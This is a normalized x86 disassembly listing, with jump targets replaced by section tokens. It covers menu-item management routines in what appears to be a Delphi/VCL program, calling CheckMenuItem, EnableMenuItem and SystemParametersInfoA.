xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_45fb60
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_45f1ac
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_45f1f8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_45f3da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_40338c
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_45f1ac
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_45fb60
mov esi eax
mov eax edi
call sub_45f17c
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_40432c
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402ba4
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_403fb8
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_45cc8c
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_40422c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f3e1
lea eax [ ebp - 0x24 ]
call sub_403f20
lea eax [ ebp - 0x10 ]
call sub_403f20
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_45dbc8
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_45f40c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_40432c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403f74
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45f434
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45f5a4
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_45f5b4
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_45f47c
sub_45f47c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_45db38
push eax
call CheckMenuItem
mov eax esi
call sub_45f434
sub_45f4d0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_45f5a4
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_45db38
push eax
call EnableMenuItem
sub_45f548
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_45f908
mov edx eax
mov ecx ebx
mov eax edi
call sub_45dad8
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_45f434
sub_45f5b4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418470
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_45cbe0
sub_45f624
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_45f5a4
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_45f60c
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_45f93c
mov ecx ebx
mov edx esi
mov eax edi
call sub_45f730
sub_45f66c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45f5a4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45f5b4
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_45f6c4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_45f5a4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_45f5b4
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_45f5b4
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_45f730
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_45cbe0
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_45dad8
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_4184ec
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_45f9a8
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_45f5a4
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45da08
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_418470
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_418470
mov dl [ eax + 0x3f ]
mov eax esi
call sub_45f548
sub_45f7e4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_45cbe0
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_45f5a4
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45da08
mov eax ebx
call sub_45f5a4
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418470
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418360
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_45f858
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_45f47c
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_45f58c
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_45f58c
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_45f920
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45f5a4
mov edx eax
mov ecx esi
mov eax ebx
call sub_45f730
pop esi
pop ebx
retn
sub_45f93c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45f908
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_45f7e4
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_45cbe0
sub_45f964
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_45f9a8
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_45f9a8
jmp r-xdata
mov eax ebx
call sub_45da08
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_461680
sub_45fa00
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebx + 0x4c ] eax
sub_45fa28
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403190
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45fcbc
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_40338c
mov edx ebx
mov eax edi
call sub_420824
mov eax ebx
mov si 0xffee
call sub_40338c
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_45fa98
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ esi + 0x4c ] eax
sub_45facc
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_45f5a4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_45f5b4
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_45fb0c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_45f93c
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_45f920
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45f920
sub_45fb70
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_45f434
sub_45fb9c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_45f40c
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_45f47c
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_45f4d0
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403f74
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_45f5fc
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_45f548
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_45f5d8
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_45f5ec
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_45fcbc
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_45f58c
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_40338c
sub_45fce0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45fd00
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45fd20
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45fd40
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45fd60
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45fd80
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45fda0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45fdc0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45fde0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45fe00
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418b68
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_459c50
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_459d88
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_459de8
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_459ae8
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_459ea8
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45fe78
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_420a70
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45f58c
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45fa28
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45fecc
jmp r-xdata
xor edx edx
mov eax esi
call sub_45d990
sub_45fecc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_45b364
mov eax ebx
call sub_45ff3c
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_45b3a8
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_420824
sub_45ff14
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_45ff14
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_45d064
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45f9a8
mov eax ebx
pop esi
pop ebx
retn
sub_45ff50
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c4c8
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_404480
sub_45ff80
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_403fb8
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_460004
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_460126
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_4041e0
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_4041e0
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404440
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40432c
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46012d
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f44
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4044c8
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4042a0
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_4041e0
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404440
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_4042a0
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_460164
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_460603
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403fb8
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4605c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_45f5a4
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_403fb8
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46060a
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403f44
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403f44
lea eax [ ebp - 0x18 ]
call sub_403f20
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax ebx
call sub_4607b8
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
